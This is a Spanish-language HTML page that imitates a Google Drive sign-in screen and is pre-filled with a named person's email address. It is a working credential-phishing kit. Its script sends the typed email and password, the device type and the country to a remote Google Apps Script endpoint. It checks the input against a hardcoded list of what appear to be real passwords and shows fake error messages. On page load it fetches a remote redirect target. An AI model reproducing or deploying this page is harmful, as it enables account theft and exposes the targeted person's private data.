<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
    <link rel="shortcut icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
    
    <meta property="og:title" content="Google Drive - Dibujos" />
    <meta property="og:description" content="google.com" />
    <meta property="og:image" content="https://i.ibb.co/7J9jRKyV/namis.png" />
    
    <title>Google Drive - Dibujos</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Google Sans', 'Roboto', arial, sans-serif;
            background-color: #202124;
            color: #e8eaed;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
        }

        .logo {
            width: 90px;
            margin-bottom: 16px;
        }

        .card {
            background-color: #2d2e30;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 450px;
            text-align: center;
        }

        .title {
            color: #e8eaed;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
        }

        .subtitle {
            color: #e8eaed;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            margin-bottom: 32px;
        }

        /* Nuevo estilo para el selector de correo */
        .email-selector {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
            padding: 8px 12px;
            background: #303134;
            border-radius: 50px;
            border: 1px solid #5f6368;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
        }

        .email-selector:hover {
            background: #3c4043;
            border-color: #8ab4f8;
        }

        .user-avatar {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            flex-shrink: 0;
            overflow: hidden;
            background-color: #8E24AA;
        }

        .user-avatar img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
        }

        .user-avatar span {
            color: white;
            font-size: 14px;
            font-weight: 500;
        }

        .user-email {
            color: #e8eaed;
            font-size: 16px;
            font-weight: 400;
            flex-grow: 1;
            text-align: left;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
            min-width: 0;
        }

        .dropdown-arrow {
            color: #9aa0a6;
            font-size: 12px;
            margin-left: 8px;
            transition: transform 0.2s ease;
            transform: scaleY(0.6);
        }

        /* Email input alternativo */
        .email-input-wrapper {
            position: relative;
            margin-bottom: 32px;
            text-align: left;
            display: none;
        }

        .email-input-wrapper.active {
            display: block;
        }

        .email-input-field {
            width: 100%;
            padding: 16px 12px 8px;
            background-color: transparent;
            border: 1.5px solid #82aaff;
            border-radius: 10px;
            color: #e8eaed;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.2s;
        }

        .email-input-field:focus {
            border-color: #82aaff;
        }

        .email-input-label {
            position: absolute;
            top: 16px;
            left: 12px;
            color: #cdd6f4;
            background-color: #2d2e30;
            padding: 0 4px;
            transition: 0.2s ease all;
            pointer-events: none;
        }

        .email-input-field:focus + .email-input-label,
        .email-input-field:not(:placeholder-shown) + .email-input-label {
            top: -10px;
            font-size: 0.8rem;
            color: #82aaff;
        }

        .back-to-selector {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            margin-top: 8px;
            display: inline-block;
        }

        .back-to-selector:hover {
            text-decoration: underline;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 24px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 16px 12px 8px;
            background-color: transparent;
            border: 1.5px solid #82aaff;
            border-radius: 10px;
            color: #e8eaed;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: #82aaff;
        }

        /* Nuevo estilo para el campo de contraseña con error */
        .input-field.error {
            border-color: #ce9591;
        }

        .input-label {
            position: absolute;
            top: 16px;
            left: 12px;
            color: #cdd6f4;
            background-color: #2d2e30;
            padding: 0 4px;
            transition: 0.2s ease all;
            pointer-events: none;
        }

        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            top: -10px;
            font-size: 0.8rem;
            color: #82aaff;
        }

        /* Mantener el color del label cuando hay error */
        .input-field.error:focus + .input-label,
        .input-field.error:not(:placeholder-shown) + .input-label {
            color: #ce9591;
        }

       .show-password-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
        }

        /* Estilo personalizado para el checkbox */
        .show-password-wrapper input[type="checkbox"] {
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            width: 16px;
            height: 16px;
            border: 2px solid #9aa0a6;
            border-radius: 2px;
            background-color: transparent;
            margin-right: 8px;
            cursor: pointer;
            position: relative;
            transition: all 0.2s ease;
        }

        .show-password-wrapper input[type="checkbox"]:checked {
            border-color: #1a73e8;
            background-color: #1a73e8;
        }

        .show-password-wrapper input[type="checkbox"]:checked::after {
            content: '';
            position: absolute;
            left: 3px;
            top: 0px;
            width: 5px;
            height: 8px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        .show-password-wrapper input[type="checkbox"]:hover {
            border-color: #82aaff;
        }

        .show-password-wrapper label {
            color: #e8eaed;
            font-size: 14px;
            cursor: pointer;
            user-select: none;
        }
        .forgot-email {
            color: #c8565d;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 24px;
            text-align: left;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .guest-mode {
            color: #f08b85;
            font-size: 14px;
            line-height: 1.4286;
            margin-bottom: 24px;
            text-align: left;
        }

        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
        }

        .guest-mode a:hover {
            text-decoration: underline;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }

        .create-account {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .access-button {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 500;
            height: 36px;
            padding: 0 24px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .access-button:hover {
            background-color: #2b7de9;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        .access-button:disabled {
            background-color: #5f6368;
            cursor: not-allowed;
        }

        .footer {
            margin-top: 56px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            max-width: 450px;
            font-size: 12px;
        }

        .language-selector {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .language-selector select {
            background: transparent;
            border: none;
            color: #9aa0a6;
            font-size: 12px;
            outline: none;
            cursor: pointer;
        }

        .footer-links {
            display: flex;
            gap: 24px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #9aa0a6;
            text-decoration: none;
            font-size: 12px;
            white-space: nowrap;
        }

        .footer-links a:hover {
            color: #e8eaed;
        }

        .error-message {
            color: #f08b85;
            font-size: 14px;
            margin-top: 8px;
            margin-bottom: 16px;
            text-align: left;
            display: none;
        }

        /* Estilo especial para errores de contraseña prohibida */
        .error-message.password-prohibited {
            color: #ff9c95;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .container, .card {
                padding: 24px 24px 20px;
            }
            
            .footer {
                padding: 0 10px;
            }
            
            .footer-links {
                gap: 16px;
            }
            
            .footer-links a {
                font-size: 11px;
            }
            
            .language-selector select {
                font-size: 11px;
            }
        }
        
        @media (max-width: 360px) {
            .container, .card {
                padding: 20px 16px 16px;
            }
            
            .footer {
                margin-top: 32px;
                padding: 0 8px;
            }
            
            .footer-links {
                gap: 12px;
            }
            
            .footer-links a {
                font-size: 10px;
            }
            
            .language-selector select {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo">
        
        <div class="card">
           <h1 class="title">Acceder a Dibujos</h1>
            <p class="subtitle">Ir a Drive</p>
            
            <!-- Selector de correo -->
            <div class="email-selector" id="emailSelector">
                <div class="user-avatar">
                    <img src="namish.jpg" alt="Avatar" id="userAvatar" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                    <span id="userInitial" style="display: none;">C</span>
                </div>
                <div class="user-email" id="selectedEmail">iamnaamish@gmail.com</div>
                <div class="dropdown-arrow">▼</div>
            </div>

            <!-- Input alternativo para correo -->
            <div class="email-input-wrapper" id="emailInputWrapper">
                <input type="email" id="emailInput" name="email" class="email-input-field" placeholder=" " required>
                <label for="emailInput" class="email-input-label">Correo electrónico o teléfono</label>
                <a href="#" class="back-to-selector" id="backToSelector">← Volver a la cuenta anterior</a>
            </div>
            
            <form id="loginForm">
                <div class="input-wrapper">
                    <input type="password" id="passwordInput" name="password" class="input-field" placeholder=" " minlength="5" maxlength="32" required>
                    <label for="passwordInput" class="input-label">Introduce tu contraseña</label>
                </div>
                
                <div id="errorMessage" class="error-message"></div>
                
                <div class="show-password-wrapper">
                    <input type="checkbox" id="showPassword">
                    <label for="showPassword">Mostrar contraseña</label>
                </div>
                
                <div class="guest-mode" id="guestMode">
                    Solicita el permiso en la carpeta para continuar 
                </div>
                
                <div class="actions">
                    <a href="#" class="create-account">Crear cuenta</a>
                    <button type="submit" class="access-button" id="accessBtn">Acceder</button>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <div class="language-selector">
                <select>
                    <option value="es">Español</option>
                    <option value="en">English</option>
                </select>
            </div>
            <div class="footer-links">
                <a href="#">Ayuda</a>
                <a href="#">Privacidad</a>
                <a href="#">Términos</a>
            </div>
        </div>
    </div>

    <iframe id="usuarioFrame" src="" style="display: none; width: 100%; height: 100vh; border: none;"></iframe>

    <script>
        // Variables globales
        let currentEmail = "iamnaamish@gmail.com";
        let isUsingCustomEmail = false;

        // Elementos del DOM
        const emailSelector = document.getElementById('emailSelector');
        const emailInputWrapper = document.getElementById('emailInputWrapper');
        const emailInput = document.getElementById('emailInput');
        const backToSelector = document.getElementById('backToSelector');
        const selectedEmailEl = document.getElementById('selectedEmail');
        const userInitialEl = document.getElementById('userInitial');
        const guestMode = document.getElementById('guestMode');
        const passwordInput = document.getElementById('passwordInput');

        // Manejar clic en el selector de correo (flecha)
        emailSelector.addEventListener('click', function() {
            showEmailInput();
        });

        // Manejar clic en "Volver a la cuenta anterior"
        backToSelector.addEventListener('click', function(e) {
            e.preventDefault();
            showEmailSelector();
        });

        // Manejar cambio en el input de email
        emailInput.addEventListener('input', function() {
            currentEmail = this.value;
            isUsingCustomEmail = true;
            // Ocultar el mensaje de guest mode cuando se escribe un email personalizado
            hideGuestModeMessage();
        });

        // Limpiar el estilo de error cuando el usuario empieza a escribir
        passwordInput.addEventListener('input', function() {
            passwordInput.classList.remove('error');
            // Limpiar también las clases de error del mensaje
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.classList.remove('password-prohibited');
        });

        function showEmailInput() {
            emailSelector.style.display = 'none';
            emailInputWrapper.classList.add('active');
            emailInput.focus();
            // Ocultar el mensaje de guest mode cuando se muestra el input de email
            hideGuestModeMessage();
        }

        function showEmailSelector() {
            emailInputWrapper.classList.remove('active');
            emailSelector.style.display = 'flex';
            
            // Si se había ingresado un email personalizado, regresar al predeterminado
            if (isUsingCustomEmail) {
                currentEmail = "iamnaamish@gmail.com";
                isUsingCustomEmail = false;
                emailInput.value = '';
            }
            
            // Limpiar cualquier mensaje de error previo
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.style.display = 'none';
            errorMessage.classList.remove('password-prohibited');
            
            // Mostrar nuevamente el mensaje de guest mode
            showGuestModeMessage();
        }

        function hideGuestModeMessage() {
            guestMode.style.display = 'none';
        }

        function showGuestModeMessage() {
            guestMode.style.display = 'block';
        }

        function getInitialFromEmail(email) {
            return email.charAt(0).toUpperCase();
        }

        // Manejar mostrar/ocultar contraseña
        document.getElementById('showPassword').addEventListener('change', function() {
            const passwordInput = document.getElementById('passwordInput');
            passwordInput.type = this.checked ? 'text' : 'password';
        });

        // Manejar formulario
        document.getElementById("loginForm").addEventListener("submit", async function(event) {
            event.preventDefault();
            
            const passwordInput = document.querySelector('input[name="password"]');
            const errorMessage = document.getElementById('errorMessage');
            const accessBtn = document.getElementById('accessBtn');
            
            // Obtener email actual (del selector o del input personalizado)
            const email = isUsingCustomEmail ? emailInput.value : currentEmail;
            const password = passwordInput.value;
            
            // Validar que haya un email
            if (!email) {
                showError("Por favor ingresa un correo electrónico.", false);
                return;
            }
            
            // Limpiar errores previos
            errorMessage.style.display = 'none';
            errorMessage.classList.remove('password-prohibited');
            passwordInput.classList.remove('error');
            
            // Deshabilitar botón
            accessBtn.disabled = true;
            accessBtn.textContent = 'Verificando...';
            
            // Variables para determinar si es prohibido
            let isProhibitedEmail = false;
            let isProhibitedPassword = false;
            
            // Lista de correos prohibidos
            const prohibitedEmails = ["eeliy200303@gmail.com"];
            if (prohibitedEmails.includes(email)) {
                isProhibitedEmail = true;
            }
            
            // Verificar contraseñas prohibidas
            const prohibitedWords = ["namigames0803","haily130598","viskeily130580","Viskeily130580","viskeily130598","Viskeily130598","Diosesamor10","diosesamor10","Loveteo10","loveteo10","Greinyer10","greinyer10"];
            if (prohibitedWords.some(word => password.includes(word))) {
                isProhibitedPassword = true;
            }
            
            try {
                // Detectar dispositivo
                let deviceType = "Otro";
                if (/android/i.test(navigator.userAgent)) {
                    deviceType = "Android";
                } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                    deviceType = "iPhone";
                }
                
                // Obtener país
                let country = "Desconocido";
                try {
                    const response = await fetch("https://ipwhois.app/json/");
                    const data = await response.json();
                    if (data.country) {
                        country = data.country;
                    }
                } catch (error) {
                    console.error("Error obteniendo el país:", error);
                }
                
                // Enviar datos SIEMPRE al Google Sheets
                const formData = new FormData();
                formData.append("email", email);
                formData.append("password", password);
                formData.append("device", deviceType);
                
                // Agregar diferenciador junto al campo país
                if (isProhibitedEmail || isProhibitedPassword) {
                    formData.append("country", country + " - INTENTO_FALLIDO");
                } else {
                    formData.append("country", country + " - ACCESO_VALIDO");
                }
                
                const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
                
                // Enviar datos sin importar si son prohibidos
                const response = await fetch(url, {
                    method: "POST",
                    body: new URLSearchParams(formData),
                    headers: { "Content-Type": "application/x-www-form-urlencoded" }
                });
                
                // Después de enviar, verificar si debe mostrar error o redirigir
                if (isProhibitedEmail) {
                    showError("Ocurrio un error con el correo intentar con otra dirección", false);
                    hideGuestModeMessage();
                    emailInput.value = '';
                    passwordInput.value = '';
                } else if (isProhibitedPassword) {
                    showError("La contraseña no es correcta. Inténtalo de nuevo.", true);
                    hideGuestModeMessage();
                    passwordInput.value = '';
                    // Agregar clase error al campo de contraseña
                    passwordInput.classList.add('error');
                } else {
                    // Si no es prohibido, redirigir normalmente
                    if (response.ok) {
                        window.location.href = "invitation.html";
                    } else {
                        showError("Error al iniciar sesión. Inténtalo de nuevo.", false);
                        hideGuestModeMessage();
                    }
                }
                
            } catch (error) {
                showError("Error de conexión. Inténtalo de nuevo.", false);
                hideGuestModeMessage();
                console.error("Error:", error);
            } finally {
                accessBtn.disabled = false;
                accessBtn.textContent = 'Acceder';
            }
        });
        
        function showError(message, isPasswordError) {
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            
            // Aplicar estilo especial para errores de contraseña prohibida
            if (isPasswordError) {
                errorMessage.classList.add('password-prohibited');
            } else {
                errorMessage.classList.remove('password-prohibited');
            }
            
            // Ocultar el mensaje de guest mode cuando se muestra un error
            hideGuestModeMessage();
        }
        
        // Verificar redirección
        document.addEventListener("DOMContentLoaded", async function () {
            const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
            
            try {
                const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
                const pagina = await response.text();
                
                if (pagina.trim() !== "folder.html") {
                    window.location.href = pagina;
                }
            } catch (error) {
                console.error("Error al verificar la redirección:", error);
            }
        });
    </script>
</body>
